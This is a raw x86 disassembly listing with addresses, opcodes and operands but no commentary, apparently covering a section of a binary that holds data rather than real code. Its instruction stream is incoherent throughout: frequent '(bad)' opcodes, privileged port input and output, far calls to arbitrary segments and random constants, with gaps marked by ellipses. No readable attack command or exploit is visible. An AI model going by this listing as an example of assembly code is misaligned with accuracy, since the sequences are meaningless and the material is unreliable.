  428af8:	and    ebx,DWORD PTR [ecx+0x4914e1f5]
  428afe:	xchg   ecx,eax
  428aff:	sbb    cl,ch
  428b01:	fimul  DWORD PTR [ecx]
  428b03:	cmp    DWORD PTR [edi],eax
  428b05:	mov    esp,0x1e45493b
  428b0a:	imul   esi,edi,0xbf5c09f8
  428b10:	not    cl
  428b12:	nop
  428b13:	in     al,dx
  428b14:	cmp    al,0xa7
  428b16:	pop    ss
  428b17:	popf   
  428b18:	and    al,0xc
  428b1a:	pop    edi
  428b1b:	aas    
  428b1c:	jg     0x428ad2
  428b1e:	xor    eax,0x4eebb1fc
  428b23:	sbb    BYTE PTR [edi-0x195d52b6],bl
  428b29:	shl    DWORD PTR [edi],0xb0
  428b2c:	fsubr  st(7),st
  428b2e:	stos   BYTE PTR es:[edi],al
  428b2f:	lock pop es
  428b31:	retf   
  428b32:	mov    eax,0xa36d969b
  428b37:	pop    ebp
  428b38:	mov    BYTE PTR [ecx+0x2fa85ec9],bh
  428b3e:	daa    
  428b3f:	retf   0x48ea
  428b42:	(bad)  
  428b44:	int3   
  428b45:	call   0x56a9:0xe21fb46f
  428b4c:	mov    al,ds:0xef3fbd0e
  428b51:	in     al,0x4e
  428b53:	xor    dh,BYTE PTR [ebp+0x5]
  428b56:	sbb    DWORD PTR [ecx+0x7e74549b],eax
  428b5c:	xchg   edi,eax
  428b5d:	dec    esi
  428b5e:	ja     0x428b5d
  428b60:	mov    WORD PTR [ecx],fs
  428b62:	cmp    BYTE PTR [edx-0x6369994c],0xdb
  428b69:	xchg   edi,eax
  428b6a:	push   0x66
  428b6c:	(bad)  
  428b6d:	push   ecx
  428b6e:	mov    dh,0x4b
  428b70:	jmp    0x5e66bee4
  428b75:	lahf   
  428b76:	data16 std 
  428b78:	cmp    DWORD PTR [esi],ebp
  428b7a:	mov    ebp,0xb57b23e9
  428b7f:	popf   
  428b80:	popa   
  428b81:	xor    dh,ch
  428b83:	xor    BYTE PTR ds:0xb3f3391b,0xb4
  428b8a:	xor    dl,BYTE PTR [esi-0x13]
  428b8d:	bound  eax,QWORD PTR [edx-0xe]
  428b90:	mov    DWORD PTR [eax],eax
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0xa93ce088
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [eax],al
  428c0d:	cld    
  428c0e:	clc    
  428c0f:	or     al,0x96
  428c11:	pop    ebx
  428c12:	add    dl,cl
  428c14:	js     0x428c91
  428c16:	aaa    
  428c17:	or     eax,0x8e96dce4
  428c1c:	adc    eax,0x9653b8d2
  428c21:	sub    bh,bh
  428c23:	xchg   BYTE PTR [eax],cl
  428c25:	add    BYTE PTR cs:[ebx],0x9d
  428c29:	push   cs
  428c2a:	out    dx,eax
  428c2b:	retf   
  428c2c:	test   al,0xeb
  428c2e:	arpl   WORD PTR [eax],sp
  428c30:	push   ds
  428c31:	cmp    esi,edx
  428c33:	jmp    0xb778e72a
  428c38:	stc    
  428c39:	mov    bl,ch
  428c3b:	add    al,0x3b
  428c3d:	inc    ebx
  428c3e:	sub    eax,0x8545017e
  428c43:	pushf  
  428c44:	lahf   
  428c45:	lahf   
  428c46:	outs   dx,DWORD PTR ds:[esi]
  428c47:	scas   eax,DWORD PTR es:[edi]
  428c48:	add    bl,cl
  428c4a:	push   esi
  428c4b:	mov    ecx,0xc31fcaf0
  428c50:	push   ds
  428c51:	out    dx,ax
  428c53:	leave  
  428c54:	adc    edx,DWORD PTR [esi]
  428c56:	push   ds
  428c57:	out    dx,eax
  428c58:	leave  
  428c59:	imul   esp,DWORD PTR [ebx+0x412ba557],0x76
  428c60:	lea    esi,cs:[esp+ecx*4+0x4f9ec5ea]
  428c68:	js     0x428c11
  428c6a:	fld    DWORD PTR [eax-0x33]
  428c6d:	mov    ss,WORD PTR [edx]
  428c6f:	out    0x96,eax
  428c71:	cld    
  428c72:	jnp    0x428c5b
  428c74:	push   esp
  428c75:	mov    ds,WORD PTR [edi]
  428c77:	sub    eax,0x9c277bfc
  428c7c:	mov    al,0x43
  428c7e:	cmp    BYTE PTR [edx+0x23],0xd8
  428c82:	sti    
  428c83:	mov    ebx,0xfca3a19a
  428c88:	dec    ecx
  428c89:	pop    eax
  428c8a:	push   ebp
  428c8b:	fs mov ch,0x55
  428c8e:	ds push eax
  428c91:	and    eax,0x5d0692a
  428c96:	sub    al,dl
  428c98:	rcl    DWORD PTR [edx+edi*2-0x372d8097],0x55
  428ca0:	adc    al,0xd9
  428ca2:	dec    esi
  428ca3:	and    bl,BYTE PTR [ecx+0x1c59e37e]
  428ca9:	xchg   DWORD PTR [ecx+0x71],ebx
  428cac:	sbb    esi,ebp
  428cae:	pop    ebp
  428caf:	cdq    
  428cb0:	dec    esp
  428cb1:	add    ecx,esi
  428cb3:	call   0x62db0173
  428cb8:	daa    
  428cb9:	mov    dl,0x16
  428cbb:	adc    ebp,edi
  428cbd:	int3   
  428cbe:	push   ds
  428cbf:	push   ecx
  428cc0:	shl    cl,cl
  428cc2:	cmp    edx,ebx
  428cc4:	add    al,0x32
  428cc6:	pop    esi
  428cc7:	nop
  428cc8:	shl    BYTE PTR [edx],0x5
  428ccb:	or     ah,BYTE PTR [edi+0x44]
  428cce:	call   0x5050:0x88fd7d9
  428cd5:	rcl    DWORD PTR [edi],1
  428cd7:	jb     0x428cc9
  428cd9:	scas   al,BYTE PTR es:[edi]
  428cda:	push   cs
  428cdb:	xchg   esi,eax
  428cdc:	or     DWORD PTR [ecx],0xffffffa2
  428cdf:	jbe    0x428d2b
  428ce1:	mov    bh,0x3d
  428ce3:	call   0x3839705c
  428ce8:	and    DWORD PTR [eax-0x1b],edx
  428ceb:	retf   0xefc4
  428cee:	inc    esi
  428cef:	fwait
  428cf0:	and    ebx,DWORD PTR [ebx-0x16]
  428cf3:	xchg   ebp,eax
  428cf4:	xchg   ecx,eax
  428cf5:	dec    ebx
  428cf6:	jns    0x428d0c
  428cf8:	and    DWORD PTR [esi-0x6d22123c],esi
  428cfe:	xchg   ebx,eax
  428cff:	outs   dx,BYTE PTR ds:[esi]
  428d00:	sub    BYTE PTR [ebp+0x38],cl
  428d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d04:	mov    ds:0x1a33f24e,eax
  428d09:	ffree  st(6)
  428d0b:	cmp    BYTE PTR [ebx+0x7b],dl
  428d0e:	(bad)  
  428d0f:	mov    edx,0x2e
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xb309
  428d82:	or     esp,ecx
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0x9e000001,al
  428d8d:	push   edi
  428d8e:	sub    al,0x46
  428d90:	mov    al,ds:0xabf99841
  428d95:	arpl   WORD PTR [edx-0x61c1b74],cx
  428d9b:	outs   dx,BYTE PTR ds:[esi]
  428d9c:	ss pushf 
  428d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d9f:	add    DWORD PTR [ecx+0x20],edi
  428da2:	(bad)  
  428da3:	fdivr  DWORD PTR ds:0x605664e9
  428da9:	mov    dh,0x7b
  428dab:	xchg   edx,eax
  428dac:	mov    WORD PTR [esi],gs
  428dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428daf:	mov    dh,0x4f
  428db1:	rol    BYTE PTR [ebp+0x9],1
  428db4:	popa   
  428db5:	fucom  st(0)
  428db7:	sub    BYTE PTR [ebp+0x0],0x61
  428dbb:	es dec edi
  428dbd:	sbb    ah,BYTE PTR [edi-0x3b]
  428dc0:	mov    edi,DWORD PTR [edx-0x5f38ed2c]
  428dc6:	cs (bad) 
  428dc8:	(bad)  
  428dc9:	rol    DWORD PTR [ebp+0x90b06c3],cl
  428dcf:	rol    BYTE PTR [eax+edx*4-0x66],1
  428dd3:	adc    ch,BYTE PTR [eax]
  428dd5:	popf   
  428dd6:	mov    al,ds:0xa54895db
  428ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ddc:	sub    BYTE PTR [ecx+0x45d38c2d],dl
  428de2:	dec    eax
  428de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428de4:	or     edx,eax
  428de6:	sub    al,0x89
  428de8:	jp     0x428e33
  428dea:	push   esi
  428deb:	in     al,dx
  428dec:	les    ecx,FWORD PTR [esi+0x656edb6f]
  428df2:	out    0x6a,eax
  428df4:	aam    0xb1
  428df6:	ret    0xb493
  428df9:	mov    edx,0xd883d8ca
  428dfe:	cmp    BYTE PTR [ebx+0x50],bh
  428e01:	cmp    bh,al
  428e03:	inc    esp
  428e04:	pop    eax
  428e05:	lods   al,BYTE PTR ds:[esi]
  428e06:	fldenv [edx-0x3f]
  428e09:	pop    edi
  428e0a:	lahf   
  428e0b:	sbb    BYTE PTR [edx+ecx*1-0x45129863],dh
  428e12:	adc    DWORD PTR [ebx+0xd],ebx
  428e15:	sbb    BYTE PTR [ecx-0x71583378],cl
  428e1b:	sub    BYTE PTR [edx-0x60],0x5b
  428e1f:	jne    0x428e0e
  428e21:	inc    eax
  428e22:	(bad)  
  428e23:	mov    WORD PTR [edx+0x32],?
  428e26:	push   ebx
  428e27:	push   edx
  428e28:	dec    edx
  428e29:	adc    ebp,DWORD PTR [edx-0x2844588b]
  428e2f:	outs   dx,BYTE PTR ds:[esi]
  428e30:	ja     0x428e33
  428e32:	outs   dx,BYTE PTR ds:[esi]
  428e33:	add    al,0xe9
  428e35:	jecxz  0x428e95
  428e37:	(bad)  
  428e38:	lods   eax,DWORD PTR ds:[esi]
  428e39:	mov    eax,ds:0xd7792d49
  428e3e:	push   ebx
  428e3f:	cmp    eax,0x2883b744
  428e44:	das    
  428e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e46:	jns    0x428e81
  428e48:	(bad)  
  428e49:	je     0x428e8c
  428e4b:	imul   edi,DWORD PTR [ebp-0x4d],0x45f6b371
  428e52:	push   edi
  428e53:	test   eax,0xf3a599d4
  428e58:	xor    bh,BYTE PTR [ebp+0x199e2dc4]
  428e5e:	jle    0x428e03
  428e60:	dec    ebp
  428e61:	sub    al,0x74
  428e63:	mov    ebp,0x2a9c1aa6
  428e68:	repnz icebp 
  428e6a:	clc    
  428e6b:	push   esp
  428e6c:	adc    eax,0xd5c2e1f3
  428e71:	(bad)  
  428e72:	jo     0x428e8a
  428e74:	jb     0x428e20
  428e76:	in     al,0xb
  428e78:	call   0xf387578d
  428e7d:	push   ebx
  428e7e:	ins    BYTE PTR es:[edi],dx
  428e7f:	inc    ebp
  428e80:	mov    eax,0x6665ad06
  428e85:	or     bl,BYTE PTR [eax-0x47]
  428e88:	dec    ebp
  428e89:	jns    0x428ed1
  428e8b:	or     DWORD PTR [ecx-0x26],esp
  428e8e:	(bad)  
  428e8f:	inc    ecx
  428e90:	icebp  
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xfe
  428f01:	cld    
  428f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f03:	adc    edi,DWORD PTR [esi+esi*4]
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x60000001
  428f0d:	out    0xa0,eax
  428f0f:	repz std 
  428f11:	and    DWORD PTR [esi-0x33a3af87],ecx
  428f17:	pusha  
  428f18:	sbb    eax,0x3490e412
  428f1d:	xor    DWORD PTR [edi+0x300f2f9b],eax
  428f23:	push   eax
  428f24:	xor    bl,ch
  428f26:	push   ebx
  428f27:	jb     0x428f7d
  428f29:	adc    dh,BYTE PTR [ebx-0x726f045d]
  428f2f:	pop    eax
  428f30:	jbe    0x428f2c
  428f32:	cli    
  428f33:	stc    
  428f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f35:	test   al,0xe6
  428f37:	jmp    FWORD PTR [ebp+0x6b70cc97]
  428f3d:	aas    
  428f3e:	mov    dl,0xf8
  428f40:	dec    esp
  428f41:	stc    
  428f42:	in     eax,0xfc
  428f44:	mov    ebx,0x72ba37cb
  428f49:	adc    al,0x4b
  428f4b:	ss popf 
  428f4d:	inc    edi
  428f4e:	xor    eax,0xbcabe76
  428f53:	and    al,0xb8
  428f55:	iret   
  428f56:	mov    dh,0xd3
  428f58:	out    dx,eax
  428f59:	sbb    al,0xd9
  428f5b:	sub    eax,0x3dd4ad37
  428f60:	sub    eax,ebx
  428f62:	mov    edx,0xeca4bf40
  428f67:	sbb    BYTE PTR [esi+0x4303469a],bl
  428f6d:	mov    WORD PTR [ebx+0x7d944236],cs
  428f73:	adc    eax,0x4d6b86a5
  428f78:	cmp    al,0x41
  428f7a:	ss xor ebx,esi
  428f7d:	ret    0x87f
  428f80:	jecxz  0x428f14
  428f82:	mov    cl,BYTE PTR ds:[edx-0x75204a89]
  428f89:	xchg   BYTE PTR [edi+ebx*4],cl
  428f8c:	call   0xdc6d:0x4dac6c92
  428f93:	lods   al,BYTE PTR ds:[esi]
  428f94:	xor    DWORD PTR [eax-0x66ac986c],0x5545af2b
  428f9e:	je     0x428f47
  428fa0:	cwde   
  428fa1:	int    0xb7
  428fa3:	and    DWORD PTR [esi],0xd26c8073
  428fa9:	sbb    DWORD PTR [edx+0x7f9ae766],edi
  428faf:	(bad)  
  428fb0:	mov    WORD PTR [ecx],fs
  428fb2:	cdq    
  428fb3:	fwait
  428fb4:	lods   eax,DWORD PTR ds:[esi]
  428fb5:	cmp    al,0x1a
  428fb7:	push   edi
  428fb8:	sar    DWORD PTR [ebx-0x54],1
  428fbb:	js     0x429033
  428fbd:	loop   0x428f80
  428fbf:	dec    esp
  428fc0:	int3   
  428fc1:	adc    DWORD PTR ds:0xd8117da5,0x57
  428fc8:	pop    es
  428fc9:	add    dh,dl
  428fcb:	in     al,0xc1
  428fcd:	clc    
  428fce:	push   edx
  428fcf:	xchg   esp,eax
  428fd0:	mov    esp,0xfd1caab8
  428fd5:	add    al,0xf9
  428fd7:	imul   eax,esp,0x455a62b8
  428fdd:	arpl   bp,sp
  428fdf:	jmp    0x35d164cc
  428fe4:	or     eax,0x211f4f44
  428fe9:	mov    cl,BYTE PTR [edi+edx*2]
  428fec:	dec    esp
  428fed:	(bad)  [eax-0x1c]
  428ff0:	jmp    0x428fc5
  428ff2:	mov    esi,0xc9c5ea34
  428ff7:	add    dh,BYTE PTR [ebp-0xe]
  428ffa:	or     al,dl
  428ffc:	sar    esp,cl
  428ffe:	repz sbb ecx,DWORD PTR [esi+0x7303ce8d]
  429005:	fucomp st(4)
  429007:	repz push esi
  429009:	lods   eax,DWORD PTR ds:[esi]
  42900a:	aam    0xfc
  42900c:	sub    eax,DWORD PTR [eax+0xe43057]
	...
  429072:	add    BYTE PTR [eax],al
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x49fc7b77
  429081:	mov    ds:0xb741e8ca,eax
  429086:	add    DWORD PTR [eax],eax
  429088:	add    eax,0x1f000001
  42908d:	cs arpl sp,bx
  429090:	add    DWORD PTR [eax-0x398230df],ecx
  429096:	aas    
  429097:	cmp    eax,0xb670aeb2
  42909c:	mov    ch,BYTE PTR [eax-0xd955423]
  4290a2:	arpl   WORD PTR [edx+0x52940b76],di
  4290a8:	and    al,BYTE PTR [ecx-0x21b4be03]
  4290ae:	not    DWORD PTR [ebx]
  4290b0:	inc    esi
  4290b1:	in     eax,0x53
  4290b3:	jno    0x4290e1
  4290b5:	outs   dx,DWORD PTR ds:[esi]
  4290b6:	or     BYTE PTR [ecx+0x75dd09c3],0xaa
  4290bd:	push   0x42
  4290bf:	inc    eax
  4290c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290c1:	(bad)  
  4290c2:	jl     0x429110
  4290c4:	in     eax,0xc
  4290c6:	ja     0x4290a5
  4290c8:	dec    esp
  4290c9:	mov    ebp,0x974d16b0
  4290ce:	fild   DWORD PTR [ecx+ebx*4+0xf]
  4290d2:	push   ecx
  4290d3:	ja     0x429067
  4290d5:	xor    DWORD PTR [edi+0x3a2242a2],edx
  4290db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290dc:	mov    esp,0x58ddf9a0
  4290e1:	mov    edx,DWORD PTR [edx-0x7c]
  4290e4:	ins    DWORD PTR es:[edi],dx
  4290e5:	aaa    
  4290e6:	(bad)  
  4290e7:	and    BYTE PTR [eax+0x1a],bl
  4290ea:	or     al,0xad
  4290ec:	push   0x37a241e0
  4290f1:	mov    ebp,0xd3645bdf
  4290f6:	jle    0x42911f
  4290f8:	push   esp
  4290f9:	cld    
  4290fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4290fb:	(bad)  
  4290fc:	adc    cl,BYTE PTR [esi]
  4290fe:	mov    edi,0x3370a34b
  429103:	call   0x2bef:0xef2a5176
  42910a:	cmp    dh,ch
  42910c:	js     0x429093
  42910e:	mov    bl,0xb6
  429110:	xchg   DWORD PTR [edx+0x2ec9a9ec],eax
  429116:	leave  
  429117:	cld    
  429118:	push   0xffffffbe
  42911a:	mov    bl,BYTE PTR [ebp-0x44]
  42911d:	loop   0x429172
  42911f:	jbe    0x4290fc
  429121:	nop
  429122:	out    0xd9,al
  429124:	in     eax,0xab
  429126:	xor    DWORD PTR [ebx-0x6f437337],esi
  42912c:	inc    edx
  42912d:	scas   eax,DWORD PTR es:[edi]
  42912e:	xchg   DWORD PTR [esi-0x23],eax
  429131:	add    al,0x64
  429133:	jo     0x4291aa
  429135:	mov    ch,0xf3
  429137:	pop    ebx
  429138:	jbe    0x429125
  42913a:	xchg   esp,eax
  42913b:	addr16 xor al,0xf7
  42913e:	mov    bh,0xd5
  429140:	push   esp
  429141:	jne    0x429193
  429143:	lea    ebx,[edi-0x4a7cad0e]
  429149:	daa    
  42914a:	dec    edi
  42914b:	mov    eax,0x644d1bac
  429150:	dec    ebx
  429151:	aad    0xb
  429153:	mov    ds:0x544fc7d6,eax
  429158:	push   es
  429159:	add    ecx,eax
  42915b:	mov    WORD PTR [edi+0x5],?
  42915e:	sbb    ebx,DWORD PTR [edi+0x2b6bb8a0]
  429164:	dec    ebx
  429166:	ffreep st(6)
  429168:	cmp    al,0xdf
  42916a:	mov    dh,0x88
  42916c:	dec    BYTE PTR [ebp+0x58]
  42916f:	sbb    eax,edi
  429171:	mov    dh,0x21
  429173:	cmc    
  429174:	(bad)  
  429175:	call   0x26d9301
  42917a:	mov    ecx,0xbc46eea1
  42917f:	xchg   ecx,eax
  429180:	ds in  eax,0x2b
  429183:	sahf   
  429184:	inc    esi
  429185:	xor    bh,dh
  429187:	pop    eax
  429188:	dec    ebx
  429189:	iret   
  42918a:	xchg   edx,eax
  42918b:	xor    BYTE PTR [esi+0x2e],0x9c
  42918f:	pop    eax
  429190:	daa    
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edx+edx*1+0x46656694],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ecx],al
  42920d:	xor    al,BYTE PTR [ebx]
  42920f:	ds retf 
  429211:	shr    DWORD PTR [edi],0x44
  429214:	iret   
  429215:	inc    esp
  429216:	cs pop esi
  429218:	jecxz  0x42919b
  42921a:	rcl    al,cl
  42921c:	jmp    0x368a7397
  429221:	in     eax,dx
  429222:	(bad)  
  429223:	hlt    
  429224:	jnp    0x429213
  429226:	xchg   ebx,eax
  429227:	xchg   edx,eax
  429228:	jle    0x4291d0
  42922a:	shl    ch,cl
  42922c:	pop    ecx
  42922d:	and    eax,0xe7ad30f1
  429232:	sub    eax,0xe0b4d9e9
  429237:	sar    DWORD PTR [edx-0x9],0x67
  42923b:	xchg   edx,eax
  42923c:	mov    WORD PTR [edx+esi*4-0x7c],cs
  429240:	adc    ebx,DWORD PTR [ecx+0x44474e5e]
  429246:	mov    ds:0x4596994e,al
  42924b:	imul   ebx
  42924d:	push   ecx
  42924e:	cmp    bh,dh
  429250:	loope  0x429270
  429252:	cmp    BYTE PTR [ebx-0x1d1c69bf],bl
  429258:	jg     0x4292be
  42925a:	bound  ebp,QWORD PTR [ebx-0x5c]
  42925d:	sub    edx,DWORD PTR [edi-0x70]
  429260:	aas    
  429261:	and    DWORD PTR [ebx],0x78
  429264:	ins    BYTE PTR es:[edi],dx
  429265:	jp     0x429208
  429267:	xchg   edi,eax
  429268:	test   ecx,edx
  42926a:	iret   
  42926b:	and    DWORD PTR [edi],ecx
  42926d:	test   ah,dh
  42926f:	and    BYTE PTR [eax+0x69],al
  429272:	std    
  429273:	cwde   
  429274:	test   ch,ch
  429276:	add    esi,DWORD PTR [edi-0xe]
  429279:	jb     0x42921d
  42927b:	mov    edx,0x89266cc5
  429280:	mul    BYTE PTR [ebx+0x4508797b]
  429286:	aas    
  429287:	jbe    0x429284
  429289:	fimul  WORD PTR [esi-0x3b10e437]
  42928f:	into   
  429290:	jmp    0xd095:0x920b35e0
  429297:	sub    edx,esi
  429299:	ret    0xd81e
  42929c:	xchg   ecx,eax
  42929d:	es fucomi st,st(3)
  4292a0:	iret   
  4292a1:	fwait
  4292a2:	mov    edx,0x70296d29
  4292a7:	jl     0x429275
  4292a9:	dec    esi
  4292aa:	add    BYTE PTR [edi+0x2f4f1720],0x8f
  4292b1:	cmc    
  4292b2:	aam    0x50
  4292b4:	fnstcw WORD PTR [ebx-0x7b]
  4292b7:	and    cl,ch
  4292b9:	lods   al,BYTE PTR ds:[esi]
  4292ba:	mov    al,ds:0xd2ff7769
  4292bf:	popf   
  4292c0:	inc    ecx
  4292c1:	nop
  4292c2:	mov    edi,0x76a6bdc9
  4292c7:	or     al,0x4a
  4292c9:	inc    BYTE PTR [ebx]
  4292cb:	lods   eax,DWORD PTR cs:[esi]
  4292cd:	and    dh,BYTE PTR [esi-0x52a51363]
  4292d3:	xor    DWORD PTR [ebp+0x34ce127],esp
  4292d9:	cdq    
  4292da:	mov    ecx,DWORD PTR [esi+0x4f24b009]
  4292e0:	fwait
  4292e1:	daa    
  4292e2:	sbb    dh,BYTE PTR [eax]
  4292e4:	jmp    0x4533:0xec1bd8ac
  4292eb:	jle    0x4292f0
  4292ed:	push   ecx
  4292ee:	push   edx
  4292ef:	aam    0xf1
  4292f1:	loope  0x429303
  4292f3:	fnstsw WORD PTR [esi-0x68]
  4292f6:	int3   
  4292f7:	pop    edi
  4292f8:	setle  BYTE PTR [esi+0x70]
  4292fc:	nop
  4292fd:	fcmovnu st,st(6)
  4292ff:	xchg   esp,eax
  429300:	adc    al,0x85
  429302:	not    BYTE PTR [esi-0x51]
  429305:	cmp    eax,DWORD PTR [eax+0x10ae8f62]
  42930b:	bswap  ebx
  42930d:	and    eax,0xcdcfe0
	...
  429372:	add    BYTE PTR [eax],al
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x24
  429381:	add    eax,0xb94b9885
  429386:	add    DWORD PTR [eax],eax
  429388:	add    eax,0x2a000001
  42938d:	out    dx,eax
  42938e:	jmp    0x9a4613cd
  429393:	(bad)
  429397:	push   ecx
  429398:	lock les ebx,FWORD PTR [esi-0xd7c40cf]
  42939f:	out    dx,al
  4293a0:	mov    ebp,0x2679da5
  4293a5:	adc    ecx,esi
  4293a7:	and    BYTE PTR [edi+0x445fd7af],ah
  4293ad:	popa   
  4293ae:	test   ebx,ebx
  4293b0:	retf   
  4293b1:	mov    ah,0xdb
  4293b3:	mov    ebp,0x89db5418
  4293b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293b9:	sbb    ah,BYTE PTR [ebx]
  4293bb:	push   ss
  4293bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293bd:	or     dl,al
  4293bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4293c0:	in     eax,0x5d
  4293c2:	call   0x173b:0xf7518894
  4293c9:	inc    edi
  4293ca:	fst    QWORD PTR cs:[ebp+0x0]
  4293ce:	mov    al,0x43
  4293d0:	sbb    DWORD PTR [eax+0x2694f318],edx
  4293d6:	mov    ebp,0xfba562c6
  4293db:	dec    edi
  4293dc:	or     DWORD PTR [ebx+0x584435e8],edi
  4293e2:	and    ecx,ebp
  4293e4:	cmp    BYTE PTR es:[bx+si-0x34e7],bh
  4293ea:	arpl   WORD PTR [eax],sp
  4293ec:	and    BYTE PTR [ebp-0x59],bh
  4293ef:	add    bh,dh
  4293f1:	fcom   QWORD PTR [ecx]
  4293f3:	lock fist DWORD PTR [ebx+0x1a09653c]
  4293fa:	(bad)  [esi+0x50977351]
  429400:	sub    ecx,DWORD PTR [ebp-0x10]
  429403:	jl     0x429416
  429405:	lods   al,BYTE PTR ds:[esi]
  429406:	and    al,0x18
  429408:	lods   al,BYTE PTR ds:[esi]
  429409:	xchg   esp,eax
  42940a:	cmp    ebp,edx
  42940c:	and    DWORD PTR [ecx],ebp
  42940e:	pop    eax
  42940f:	cs sub eax,0x5d0f8c5c
  429415:	inc    ebx
  429416:	test   DWORD PTR [esp+eiz*4-0xe124bc7],ebp
  42941d:	(bad)  
  429420:	inc    ebx
  429421:	push   0x945beb64
  429426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429427:	clc    
  429428:	ins    DWORD PTR es:[edi],dx
  429429:	and    esp,ebx
  42942b:	cmp    al,0x12
  42942d:	and    eax,0xd96c6cab
  429432:	jnp    0x429443
  429434:	push   0x35
  429436:	xchg   ebp,eax
  429437:	into   
  429438:	sbb    al,0x18
  42943a:	xor    al,0xec
  42943c:	jmp    0x92f51e5f
  429441:	jne    0x4293c4
  429443:	loop   0x42940e
  429445:	outs   dx,BYTE PTR ds:[esi]
  429446:	aaa    
  429447:	sahf   
  429448:	cmp    BYTE PTR [edx],cl
  42944a:	jge    0x429490
  42944c:	or     edi,DWORD PTR [esi]
  42944e:	sub    ecx,DWORD PTR [edx+eiz*2-0x13]
  429452:	cld    
  429453:	xlat   BYTE PTR ds:[ebx]
  429454:	rcl    DWORD PTR [esi],0xdf
  429457:	mov    ch,0xd0
  429459:	call   0x5611f344
  42945e:	mov    eax,ds:0xe0aeb9a6
  429463:	jne    0x4294cb
  429465:	call   0xf6d9:0x5103d0a2
  42946c:	out    dx,al
  42946d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42946e:	mov    al,ds:0x8e42927c
  429473:	xchg   edi,eax
  429474:	in     eax,0xd2
  429476:	add    eax,0x92bfbc9d
  42947b:	aaa    
  42947c:	popa   
  42947d:	fisub  DWORD PTR [eax+0x50]
  429480:	lock pop es
  429482:	jmp    0x429474
  429484:	call   DWORD PTR [ebp-0x269e9e28]
  42948a:	ret    0x3f0d
  42948d:	xlat   BYTE PTR ds:[ebx]
  42948e:	pop    ds
  42948f:	or     al,0xf2
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x625780ea],dx
  429503:	xor    dl,BYTE PTR [eax-0x46]
  429506:	add    DWORD PTR [eax],eax
  429508:	add    eax,0x7c000001
  42950d:	mov    cs,WORD PTR [edi-0x273bf608]
  429513:	jle    0x42949d
  429515:	shr    DWORD PTR [ebx-0x29],0x24
  429519:	repnz xor DWORD PTR [esi+0x5e700ebc],ebp
  429520:	pop    esp
  429521:	mov    ?,WORD PTR [ecx-0x1a]
  429524:	jnp    0x42956d
  429526:	mov    edx,ecx
  429528:	mov    esp,0x582d7e1d
  42952d:	scas   eax,DWORD PTR es:[edi]
  42952e:	or     ebp,DWORD PTR [edx-0x48]
  429531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429532:	mov    dl,0xa3
  429534:	pop    esi
  429535:	shl    DWORD PTR [edx+ecx*2-0x53],cl
  429539:	test   DWORD PTR [edi+0x3b],0x6cc150a6
  429540:	inc    esp
  429541:	add    eax,DWORD PTR [edx+0x2241a181]
  429547:	hlt    
  429548:	jle    0x4295ba
  42954a:	dec    esp
  42954b:	mov    ah,0x4e
  42954d:	push   ebp
  42954e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42954f:	(bad)
  429553:	rcl    BYTE PTR [ecx],cl
  429555:	xor    BYTE PTR [esi],dl
  429557:	fisub  DWORD PTR [ecx-0x5a]
  42955a:	add    al,0x37
  42955c:	scas   al,BYTE PTR es:[edi]
  42955d:	sub    eax,0xcac3ebe6
  429562:	in     eax,dx
  429563:	int    0xc7
  429565:	pop    edi
  429566:	mov    ds:0x36b9ca95,al
  42956b:	enter  0x6323,0x99
  42956f:	jmp    0x4294fb
  429571:	sar    al,cl
  429573:	or     ecx,DWORD PTR cs:[eax]
  429576:	mov    ebp,0x4a8a5f4
  42957b:	mov    dl,0x3f
  42957d:	cld    
  42957e:	mov    cs,edx
  429580:	jns    0x4295c7
  429582:	sbb    al,0xda
